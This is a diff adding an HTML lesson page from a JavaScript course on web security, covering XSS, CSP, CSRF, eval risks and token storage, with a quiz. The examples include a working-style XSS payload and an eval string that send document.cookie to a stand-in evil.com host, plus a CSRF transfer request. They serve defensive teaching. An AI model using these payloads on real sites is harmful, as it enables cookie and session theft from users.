@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lesson 28 — Security in JavaScript</title>
+  <style>
+    :root {
+      --bg: #faf9f7;
+      --text: #1a1a1a;
+      --muted: #666;
+      --accent: #2563eb;
+      --accent-light: #eff6ff;
+      --border: #e2e8f0;
+      --code-bg: #1e1e2e;
+      --code-text: #cdd6f4;
+      --green: #16a34a;
+      --red: #dc2626;
+      --yellow: #ca8a04;
+      --green-bg: #f0fdf4;
+      --red-bg: #fef2f2;
+      --yellow-bg: #fefce8;
+      --serif: "Georgia", "Times New Roman", serif;
+      --mono: "Fira Code", "Cascadia Code", "Consolas", monospace;
+    }
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: var(--serif);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.75;
+      font-size: 18px;
+      padding: 2rem 1rem 6rem;
+    }
+    .container { max-width: 680px; margin: 0 auto; }
+    header { margin-bottom: 3rem; padding-bottom: 1.5rem; border-bottom: 2px solid var(--border); }
+    .lesson-meta { font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.08em; color: var(--muted); margin-bottom: 0.5rem; }
+    h1 { font-size: 2rem; line-height: 1.25; margin-bottom: 0.75rem; }
+    .subtitle { color: var(--muted); font-size: 1rem; font-style: italic; }
+    h2 { font-size: 1.25rem; margin: 2.5rem 0 0.75rem; padding-bottom: 0.25rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1rem; font-weight: bold; margin: 1.5rem 0 0.5rem; }
+    p { margin-bottom: 1rem; }
+    a { color: var(--accent); }
+    ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; }
+    li { margin-bottom: 0.35rem; }
+    code {
+      font-family: var(--mono);
+      font-size: 0.85em;
+      background: #f1f5f9;
+      padding: 0.15em 0.4em;
+      border-radius: 3px;
+      color: #c026d3;
+    }
+    pre {
+      background: var(--code-bg);
+      color: var(--code-text);
+      font-family: var(--mono);
+      font-size: 0.85rem;
+      line-height: 1.6;
+      padding: 1.25rem 1.5rem;
+      border-radius: 8px;
+      overflow-x: auto;
+      margin: 1rem 0 1.5rem;
+    }
+    pre code { background: none; padding: 0; color: inherit; font-size: inherit; }
+    .kw { color: #cba6f7; }
+    .fn { color: #89b4fa; }
+    .str { color: #a6e3a1; }
+    .num { color: #fab387; }
+    .cmt { color: #6c7086; font-style: italic; }
+    .typ { color: #f9e2af; }
+
+    .callout {
+      border-left: 4px solid;
+      padding: 0.85rem 1rem;
+      margin: 1.25rem 0;
+      border-radius: 0 6px 6px 0;
+      font-size: 0.92rem;
+    }
+    .callout.info { border-color: var(--accent); background: var(--accent-light); }
+    .callout.warn { border-color: var(--yellow); background: var(--yellow-bg); }
+    .callout.danger { border-color: var(--red); background: var(--red-bg); }
+    .callout.tip { border-color: var(--green); background: var(--green-bg); }
+    .callout strong { display: block; margin-bottom: 0.2rem; font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.06em; }
+
+    table { width: 100%; border-collapse: collapse; margin: 1rem 0 1.5rem; font-size: 0.9rem; }
+    th { background: #f1f5f9; text-align: left; padding: 0.5rem 0.75rem; border: 1px solid var(--border); font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.05em; }
+    td { padding: 0.5rem 0.75rem; border: 1px solid var(--border); vertical-align: top; }
+    tr:nth-child(even) td { background: #fafafa; }
+
+    /* Quiz */
+    .quiz { margin: 2.5rem 0; }
+    .quiz-title { font-size: 1.1rem; font-weight: bold; margin-bottom: 1.25rem; padding: 0.75rem 1rem; background: #1e1e2e; color: #cdd6f4; border-radius: 8px 8px 0 0; }
+    .question-block { margin-bottom: 2rem; }
+    .question-text { font-weight: bold; margin-bottom: 0.75rem; font-size: 0.95rem; }
+    .question-code {
+      background: var(--code-bg);
+      color: var(--code-text);
+      font-family: var(--mono);
+      font-size: 0.82rem;
+      padding: 0.85rem 1rem;
+      border-radius: 6px;
+      margin-bottom: 0.75rem;
+      white-space: pre;
+    }
+    .options { display: flex; flex-direction: column; gap: 0.5rem; }
+    .option {
+      display: flex;
+      align-items: center;
+      gap: 0.6rem;
+      padding: 0.6rem 0.85rem;
+      border: 1.5px solid var(--border);
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 0.9rem;
+      font-family: var(--mono);
+      transition: border-color 0.15s, background 0.15s;
+      background: white;
+    }
+    .option:hover { border-color: var(--accent); background: var(--accent-light); }
+    .option input { accent-color: var(--accent); }
+    .option.correct { border-color: var(--green); background: var(--green-bg); }
+    .option.wrong { border-color: var(--red); background: var(--red-bg); }
+    .feedback { margin-top: 0.6rem; font-size: 0.88rem; padding: 0.6rem 0.85rem; border-radius: 6px; display: none; }
+    .feedback.show { display: block; }
+    .feedback.correct { background: var(--green-bg); color: var(--green); }
+    .feedback.wrong { background: var(--red-bg); color: var(--red); }
+    .check-btn {
+      margin-top: 0.75rem;
+      padding: 0.5rem 1.25rem;
+      background: var(--accent);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 0.9rem;
+      cursor: pointer;
+      font-family: var(--serif);
+    }
+    .check-btn:hover { background: #1d4ed8; }
+    .check-btn:disabled { background: #94a3b8; cursor: default; }
+
+    .score-banner { text-align: center; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem; display: none; }
+    .score-banner.show { display: block; }
+    .score-number { font-size: 2.5rem; font-weight: bold; }
+
+    footer { margin-top: 4rem; padding-top: 1.5rem; border-top: 1px solid var(--border); font-size: 0.85rem; color: var(--muted); }
+    .nav-links { display: flex; gap: 1rem; flex-wrap: wrap; margin-top: 0.5rem; }
+    .primary-source { margin: 2rem 0; padding: 1rem; background: #fffbeb; border: 1px solid #fde68a; border-radius: 8px; }
+    .primary-source strong { display: block; margin-bottom: 0.25rem; }
+    .teacher-note { margin: 3rem 0 0; padding: 1rem 1.25rem; background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 8px; font-size: 0.9rem; }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <header>
+    <div class="lesson-meta">JavaScript Mastery · Lesson 28 of 30</div>
+    <h1>Security in JavaScript</h1>
+    <p class="subtitle">Security is not optional — seniors protect users by default.</p>
+  </header>
+
+  <div class="primary-source">
+    <strong>Primary Source for this lesson</strong>
+    Read this after the lesson:
+    <a href="https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html" target="_blank">OWASP — DOM-based XSS Prevention Cheat Sheet</a>.
+    OWASP is the global authority on web security. Bookmark it and return often.
+  </div>
+
+  <div class="callout danger">
+    <strong>Mindset First</strong>
+    Security is not a feature you add at the end. It is a default posture. Every time you insert user-provided data somewhere, your first question should be: "what could an attacker do with this?" This lesson gives you the vocabulary and patterns to answer that question.
+  </div>
+
+  <!-- SECTION 1 -->
+  <h2>1. XSS — Cross-Site Scripting</h2>
+
+  <p>XSS is the most common web vulnerability. An attacker tricks your application into rendering malicious JavaScript in another user's browser. Once that script runs, the attacker effectively controls the page for that user.</p>
+
+  <h3>Three Types of XSS</h3>
+
+  <table>
+    <thead>
+      <tr><th>Type</th><th>How It Works</th><th>Example</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Reflected</strong></td><td>Malicious input in URL is immediately reflected in the response</td><td>Search result page renders the query param without escaping</td></tr>
+      <tr><td><strong>Stored</strong></td><td>Malicious input saved to DB, served to all users later</td><td>A comment containing <code>&lt;script&gt;</code> that every visitor loads</td></tr>
+      <tr><td><strong>DOM-based</strong></td><td>Client-side JS reads attacker-controlled data and writes it to the DOM</td><td>Reading <code>location.hash</code> and setting <code>innerHTML</code></td></tr>
+    </tbody>
+  </table>
+
+  <h3>A Vulnerable DOM-based XSS Example</h3>
+
+  <pre><code><span class="cmt">// VULNERABLE: reading user-controlled input and writing to innerHTML</span>
+<span class="kw">const</span> query = <span class="kw">new</span> <span class="typ">URLSearchParams</span>(window.location.search).<span class="fn">get</span>(<span class="str">"name"</span>);
+document.<span class="fn">getElementById</span>(<span class="str">"greeting"</span>).innerHTML = <span class="str">`Hello, ${query}!`</span>;
+
+<span class="cmt">// Attack URL:</span>
+<span class="cmt">// https://yoursite.com/?name=&lt;img src=x onerror="fetch('evil.com/?c='+document.cookie)"&gt;</span>
+<span class="cmt">// Result: attacker steals the user's cookies</span></code></pre>
+
+  <p><strong>Real impact of XSS:</strong> steal cookies and session tokens, exfiltrate localStorage, redirect users to phishing pages, log keystrokes, make requests on the user's behalf.</p>
+
+  <!-- SECTION 2 -->
+  <h2>2. Preventing XSS</h2>
+
+  <p>The rule is simple: <strong>never put user-provided data directly into HTML</strong>. Here is the complete prevention toolkit:</p>
+
+  <pre><code><span class="cmt">// UNSAFE — innerHTML interprets HTML tags</span>
+element.innerHTML = userInput;
+
+<span class="cmt">// SAFE — textContent treats everything as plain text</span>
+element.textContent = userInput;
+
+<span class="cmt">// SAFE — createElement and append</span>
+<span class="kw">const</span> p = document.<span class="fn">createElement</span>(<span class="str">"p"</span>);
+p.textContent = userInput;
+container.<span class="fn">appendChild</span>(p);</code></pre>
+
+  <div class="callout danger">
+    <strong>The innerHTML Rule</strong>
+    If you must use <code>innerHTML</code> with dynamic content, you MUST sanitize it first. Use the <a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a> library — do not write your own sanitizer. Sanitization is notoriously difficult to get right.
+  </div>
+
+  <pre><code><span class="cmt">// If you MUST render HTML from user input, use DOMPurify:</span>
+<span class="kw">import</span> <span class="typ">DOMPurify</span> <span class="kw">from</span> <span class="str">"dompurify"</span>;
+
+<span class="kw">const</span> clean = <span class="typ">DOMPurify</span>.<span class="fn">sanitize</span>(userHtmlInput);
+element.innerHTML = clean; <span class="cmt">// safe — malicious tags stripped</span>
+
+<span class="cmt">// Also avoid these with user input:</span>
+<span class="fn">eval</span>(userInput);              <span class="cmt">// executes arbitrary code</span>
+<span class="kw">new</span> <span class="typ">Function</span>(userInput);      <span class="cmt">// same as eval</span>
+<span class="fn">setTimeout</span>(userInput, <span class="num">0</span>);    <span class="cmt">// string form runs eval</span>
+<span class="fn">setInterval</span>(userInput, <span class="num">100</span>); <span class="cmt">// same</span></code></pre>
+
+  <!-- SECTION 3 -->
+  <h2>3. Content Security Policy (CSP)</h2>
+
+  <p>CSP is an HTTP response header that tells the browser which sources of content are legitimate. Even if an attacker manages to inject a script tag, CSP can prevent it from executing.</p>
+
+  <pre><code><span class="cmt"># Strong CSP header (set on the server):</span>
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-{random}';
+  style-src 'self';
+  img-src 'self' data:;
+  connect-src 'self' https://api.yoursite.com;</code></pre>
+
+  <table>
+    <thead>
+      <tr><th>Directive</th><th>Controls</th><th>Value Example</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>default-src</code></td><td>Fallback for all resource types</td><td><code>'self'</code> — same origin only</td></tr>
+      <tr><td><code>script-src</code></td><td>JavaScript sources</td><td><code>'self' https://cdn.example.com</code></td></tr>
+      <tr><td><code>style-src</code></td><td>CSS sources</td><td><code>'self' 'unsafe-inline'</code></td></tr>
+      <tr><td><code>'nonce-xyz'</code></td><td>Allow specific inline scripts</td><td>Script tag must have matching <code>nonce</code> attribute</td></tr>
+      <tr><td><code>'none'</code></td><td>Block everything for this type</td><td><code>object-src 'none'</code> — no plugins</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout info">
+    <strong>CSP Blocks Inline Scripts by Default</strong>
+    When CSP is enabled, inline <code>&lt;script&gt;...&lt;/script&gt;</code> blocks are blocked unless you explicitly allow them with <code>'unsafe-inline'</code> (don't) or a nonce. This is intentional — it means even if an attacker injects a script tag, the browser won't run it.
+  </div>
+
+  <!-- SECTION 4 -->
+  <h2>4. CSRF — Cross-Site Request Forgery</h2>
+
+  <p>CSRF is a different attack vector. Instead of injecting code, the attacker tricks a <em>victim's browser</em> into sending an authenticated request to your server.</p>
+
+  <p>It works because browsers automatically attach cookies to requests — including to sites the user is logged into. A malicious page on <code>evil.com</code> can cause the browser to send a request to <code>yourbank.com</code>, and the bank's server sees it as legitimate because the session cookie is attached.</p>
+
+  <pre><code><span class="cmt">&lt;!-- Malicious page at evil.com --&gt;</span>
+<span class="cmt">&lt;img src="https://yourbank.com/transfer?to=attacker&amp;amount=5000" /&gt;</span>
+<span class="cmt">&lt;!-- The browser fetches this URL with the user's bank cookies --&gt;</span>
+<span class="cmt">&lt;!-- If the bank doesn't check CSRF tokens, the transfer goes through --&gt;</span></code></pre>
+
+  <h3>CSRF Mitigations</h3>
+
+  <table>
+    <thead>
+      <tr><th>Mitigation</th><th>How It Works</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>CSRF Tokens</strong></td><td>Server includes a secret token in each form. On submit, token is checked. Attacker can't know the token.</td></tr>
+      <tr><td><strong>SameSite Cookie</strong></td><td><code>Set-Cookie: session=abc; SameSite=Strict</code> — browser won't send cookie in cross-site requests</td></tr>
+      <tr><td><strong>Check Origin/Referer</strong></td><td>Server verifies the request came from the expected origin</td></tr>
+      <tr><td><strong>Custom Request Headers</strong></td><td>APIs that require headers (like <code>X-Requested-With</code>) can't be triggered by simple cross-site forms</td></tr>
+    </tbody>
+  </table>
+
+  <div class="callout tip">
+    <strong>localStorage vs Cookies for CSRF</strong>
+    localStorage data is NOT automatically sent with requests — so tokens in localStorage are safe from CSRF. However, localStorage IS accessible to JavaScript — so it is vulnerable to XSS. Properly configured HttpOnly cookies are safer for session tokens, but need CSRF protection. There is no magic answer: you must protect against both.
+  </div>
+
+  <!-- SECTION 5 -->
+  <h2>5. eval() and Dynamic Code Execution</h2>
+
+  <p><code>eval()</code> takes a string and executes it as JavaScript code. This seems powerful, but it is almost always a severe security hole when combined with user-controlled input.</p>
+
+  <pre><code><span class="cmt">// NEVER do this:</span>
+<span class="kw">const</span> userInput = <span class="str">'fetch("https://evil.com/?data=" + document.cookie)'</span>;
+<span class="fn">eval</span>(userInput); <span class="cmt">// Runs the attacker's code with full page privileges</span>
+
+<span class="cmt">// NEVER do this either (all equivalent to eval):</span>
+<span class="kw">new</span> <span class="typ">Function</span>(userInput)();
+<span class="fn">setTimeout</span>(userInput, <span class="num">0</span>);   <span class="cmt">// string form</span>
+<span class="fn">setInterval</span>(userInput, <span class="num">0</span>);  <span class="cmt">// string form</span>
+
+<span class="cmt">// SAFE: pass function references, not strings</span>
+<span class="fn">setTimeout</span>(() => <span class="fn">doSomething</span>(), <span class="num">1000</span>);  <span class="cmt">// fine</span>
+<span class="fn">setTimeout</span>(<span class="fn">doSomething</span>, <span class="num">1000</span>);         <span class="cmt">// fine</span></code></pre>
+
+  <div class="callout danger">
+    <strong>eval() is Also Slow</strong>
+    Beyond security, <code>eval()</code> prevents the JS engine from optimizing the code. The V8 JIT compiler can't optimize code it hasn't seen yet. Avoid <code>eval()</code> for both security and performance reasons.
+  </div>
+
+  <!-- SECTION 6 -->
+  <h2>6. Sensitive Data Handling</h2>
+
+  <p>Where you store sensitive data determines how it can be stolen.</p>
+
+  <table>
+    <thead>
+      <tr><th>Storage</th><th>XSS accessible?</th><th>CSRF risk?</th><th>Best for</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><code>localStorage</code></td><td>Yes — any JS can read it</td><td>No — not auto-sent</td><td>Non-sensitive user preferences</td></tr>
+      <tr><td><code>sessionStorage</code></td><td>Yes</td><td>No</td><td>Temporary state, not tokens</td></tr>
+      <tr><td>Cookie (no flags)</td><td>Yes</td><td>Yes</td><td>Nothing sensitive</td></tr>
+      <tr><td>Cookie (<code>HttpOnly</code>)</td><td>No — JS cannot read it</td><td>Yes</td><td>Session tokens (with CSRF protection)</td></tr>
+      <tr><td>Cookie (<code>HttpOnly</code> + <code>SameSite=Strict</code> + <code>Secure</code>)</td><td>No</td><td>No</td><td>Session tokens — gold standard</td></tr>
+    </tbody>
+  </table>
+
+  <pre><code><span class="cmt">// What NOT to do — tokens in localStorage are XSS targets:</span>
+localStorage.<span class="fn">setItem</span>(<span class="str">"authToken"</span>, token);
+
+<span class="cmt">// What to do — set HttpOnly cookies server-side:</span>
+<span class="cmt">// Set-Cookie: authToken=abc123; HttpOnly; Secure; SameSite=Strict; Path=/</span>
+<span class="cmt">// The browser sends this cookie automatically, but JS cannot read document.cookie to get it</span>
+
+<span class="cmt">// Never log sensitive data:</span>
+<span class="fn">console</span>.log(<span class="str">"User token:"</span>, authToken); <span class="cmt">// visible in DevTools, log aggregators</span></code></pre>
+
+  <!-- SECTION 7 -->
+  <h2>7. Third-Party Script Risks</h2>
+
+  <p>Every npm package and external script you load is an extension of trust. A compromised package has full access to your application.</p>
+
+  <h3>Subresource Integrity (SRI)</h3>
+
+  <pre><code><span class="cmt">&lt;!-- Without SRI: if the CDN is compromised, attacker code runs --&gt;</span>
+&lt;script src="https://cdn.example.com/library.js"&gt;&lt;/script&gt;
+
+<span class="cmt">&lt;!-- With SRI: browser verifies hash before executing --&gt;</span>
+&lt;script
+  src="https://cdn.example.com/library.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous"
+&gt;&lt;/script&gt;</code></pre>
+
+  <h3>npm Security Practices</h3>
+
+  <ul>
+    <li>Run <code>npm audit</code> regularly — it checks for known vulnerabilities in your dependency tree.</li>
+    <li>Use <code>package-lock.json</code> and commit it — locks exact versions, prevents surprise updates.</li>
+    <li>Prefer packages with many weekly downloads and recent maintenance.</li>
+    <li>Be suspicious of packages that request unusual permissions or have very new publication dates.</li>
+    <li>Consider <code>npm audit fix</code> — but review the changes before applying.</li>
+  </ul>
+
+  <div class="callout warn">
+    <strong>Supply Chain Attacks are Real</strong>
+    In 2021, the <code>ua-parser-js</code> package (millions of weekly downloads) was hijacked and published malware. In 2022, <code>node-ipc</code> was intentionally sabotaged. Treat every dependency as a potential attack surface.
+  </div>
+
+  <!-- QUIZ -->
+  <div class="quiz">
+    <div class="quiz-title">Retrieval Practice — 6 Questions</div>
+    <p style="font-size:0.9rem; color: var(--muted); margin-bottom: 1.5rem;">
+      Don't peek back at the lesson. Try to recall from memory. This is what builds long-term retention.
+    </p>
+
+    <!-- Q1 -->
+    <div class="question-block" id="q1">
+      <p class="question-text">1. What is the safest way to insert user-provided text into the DOM?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q1" value="a"> <code>element.innerHTML = userInput</code></label>
+        <label class="option"><input type="radio" name="q1" value="b"> <code>element.innerText = userInput</code></label>
+        <label class="option"><input type="radio" name="q1" value="c"> <code>element.textContent = userInput</code> — never use innerHTML with user data</label>
+        <label class="option"><input type="radio" name="q1" value="d"> <code>document.write(userInput)</code></label>
+      </div>
+      <button class="check-btn" onclick="check('q1','c','textContent treats everything as plain text — no HTML parsing, no script execution. innerHTML parses HTML, so a malicious string like &lt;img onerror=...&gt; would execute. Always use textContent for user-provided strings.')">Check</button>
+      <div class="feedback" id="q1-feedback"></div>
+    </div>
+
+    <!-- Q2 -->
+    <div class="question-block" id="q2">
+      <p class="question-text">2. What does XSS allow an attacker to do?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q2" value="a"> Access the server's database directly</label>
+        <label class="option"><input type="radio" name="q2" value="b"> Execute arbitrary JavaScript in the victim's browser — stealing cookies, localStorage, credentials, and more</label>
+        <label class="option"><input type="radio" name="q2" value="c"> Only display a pop-up alert on the victim's screen</label>
+        <label class="option"><input type="radio" name="q2" value="d"> Modify the server's source code</label>
+      </div>
+      <button class="check-btn" onclick="check('q2','b','XSS runs arbitrary JS in the victim\'s browser with the same privileges as the page itself. This means the attacker can read cookies, localStorage, make authenticated API calls, log keystrokes, and redirect the user.')">Check</button>
+      <div class="feedback" id="q2-feedback"></div>
+    </div>
+
+    <!-- Q3 -->
+    <div class="question-block" id="q3">
+      <p class="question-text">3. What is a CSRF attack?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q3" value="a"> An attack that exploits SQL injection in JavaScript APIs</label>
+        <label class="option"><input type="radio" name="q3" value="b"> An attack where malicious JavaScript runs in the victim's browser</label>
+        <label class="option"><input type="radio" name="q3" value="c"> Tricking a user's browser into making authenticated requests to another site, using automatically-sent cookies</label>
+        <label class="option"><input type="radio" name="q3" value="d"> An attack that intercepts HTTPS traffic on the network</label>
+      </div>
+      <button class="check-btn" onclick="check('q3','c','CSRF abuses the fact that browsers automatically send cookies with requests. A malicious page can cause the victim\'s browser to send a request to yourbank.com — with the victim\'s session cookie attached — without the victim knowing.')">Check</button>
+      <div class="feedback" id="q3-feedback"></div>
+    </div>
+
+    <!-- Q4 -->
+    <div class="question-block" id="q4">
+      <p class="question-text">4. Why is <code>eval(userInput)</code> dangerous?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q4" value="a"> It is only slow — there is no security risk</label>
+        <label class="option"><input type="radio" name="q4" value="b"> It executes arbitrary code — if user input contains malicious code, it runs with full page privileges</label>
+        <label class="option"><input type="radio" name="q4" value="c"> It only works in Node.js, not the browser</label>
+        <label class="option"><input type="radio" name="q4" value="d"> It throws a SyntaxError if the input is not valid JSON</label>
+      </div>
+      <button class="check-btn" onclick="check('q4','b','eval() converts a string to executable JS code. If that string comes from user input or an attacker-controlled source, the attacker can run any code they want with the same permissions as your page.')">Check</button>
+      <div class="feedback" id="q4-feedback"></div>
+    </div>
+
+    <!-- Q5 -->
+    <div class="question-block" id="q5">
+      <p class="question-text">5. What is the difference between <code>localStorage</code> and <code>HttpOnly</code> cookies for storing auth tokens?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q5" value="a"> They are equally secure — use either one</label>
+        <label class="option"><input type="radio" name="q5" value="b"> localStorage is more secure because it cannot be sent cross-site</label>
+        <label class="option"><input type="radio" name="q5" value="c"> localStorage is accessible via JavaScript (XSS risk); HttpOnly cookies cannot be read by JS (more secure for session tokens)</label>
+        <label class="option"><input type="radio" name="q5" value="d"> HttpOnly cookies are only available in Internet Explorer</label>
+      </div>
+      <button class="check-btn" onclick="check('q5','c','localStorage can be read by any JS running on the page — including injected XSS scripts. HttpOnly cookies are invisible to JavaScript entirely — document.cookie does not include them. They are sent automatically by the browser but cannot be stolen via XSS.')">Check</button>
+      <div class="feedback" id="q5-feedback"></div>
+    </div>
+
+    <!-- Q6 -->
+    <div class="question-block" id="q6">
+      <p class="question-text">6. What does Content Security Policy (CSP) protect against?</p>
+      <div class="options">
+        <label class="option"><input type="radio" name="q6" value="a"> SQL injection attacks on the backend database</label>
+        <label class="option"><input type="radio" name="q6" value="b"> Brute-force password attacks</label>
+        <label class="option"><input type="radio" name="q6" value="c"> XSS — by restricting which scripts can execute, even if an attacker injects script tags</label>
+        <label class="option"><input type="radio" name="q6" value="d"> CSRF attacks from external sites</label>
+      </div>
+      <button class="check-btn" onclick="check('q6','c','CSP is defense-in-depth against XSS. Even if an attacker successfully injects a script tag, the browser refuses to execute it if it violates the CSP. A strict CSP (blocking inline scripts, limiting source origins) dramatically reduces XSS impact.')">Check</button>
+      <div class="feedback" id="q6-feedback"></div>
+    </div>
+
+    <div class="score-banner" id="score-banner">
+      <div class="score-number" id="score-number"></div>
+      <div id="score-message"></div>
+    </div>
+  </div>
+
+  <h2>What's Next</h2>
+  <p>Next lesson: <strong>Testing JavaScript</strong> — unit tests, Jest, mocking, TDD, and the mindset shift that makes you a more reliable developer. You already write code that works. Now you'll write code that proves it works.</p>
+
+  <div class="teacher-note">
+    <strong>Questions?</strong> Ask your teacher agent to demonstrate a live XSS exploit on a test page, or to walk through setting up CSP headers for a real Express.js server. Security concepts stick best when you see them in action.
+  </div>
+
+  <footer>
+    <div>JavaScript Mastery · Lesson 28 — Security in JavaScript</div>
+    <div class="nav-links">
+      <a href="./0027-memory-management-performance.html">← Prev: Memory &amp; Performance</a>
+      <a href="./0029-testing-javascript.html">Next: Testing JavaScript →</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  let answered = {};
+  const total = 6;
+
+  function check(qId, correct, explanation) {
+    const selected = document.querySelector(`input[name="${qId}"]:checked`);
+    if (!selected) return;
+
+    const val = selected.value;
+    const feedback = document.getElementById(`${qId}-feedback`);
+    const options = document.querySelectorAll(`#${qId} .option`);
+    const btn = document.querySelector(`#${qId} .check-btn`);
+
+    btn.disabled = true;
+    options.forEach(opt => {
+      const input = opt.querySelector('input');
+      if (input.value === correct) opt.classList.add('correct');
+      else if (input.value === val && val !== correct) opt.classList.add('wrong');
+      input.disabled = true;
+    });
+
+    const isCorrect = val === correct;
+    answered[qId] = isCorrect;
+    feedback.innerHTML = (isCorrect ? '&#10003; Correct! ' : '&#10007; Not quite. ') + explanation;
+    feedback.className = `feedback show ${isCorrect ? 'correct' : 'wrong'}`;
+
+    if (Object.keys(answered).length === total) showScore();
+  }
+
+  function showScore() {
+    const score = Object.values(answered).filter(Boolean).length;
+    const banner = document.getElementById('score-banner');
+    const num = document.getElementById('score-number');
+    const msg = document.getElementById('score-message');
+    banner.classList.add('show');
+    num.textContent = `${score} / ${total}`;
+    if (score === total) {
+      banner.style.background = '#f0fdf4';
+      msg.textContent = 'Perfect. You know this cold. Ask your teacher what to tackle next, or read the primary source.';
+    } else if (score >= 4) {
+      banner.style.background = '#fffbeb';
+      msg.textContent = 'Good foundation. Review the questions you missed, then read the primary source to fill in the gaps.';
+    } else {
+      banner.style.background = '#fef2f2';
+      msg.textContent = 'Re-read the sections covering the ones you missed, then take the quiz again from memory.';
+    }
+  }
+</script>
+</body>
+</html>
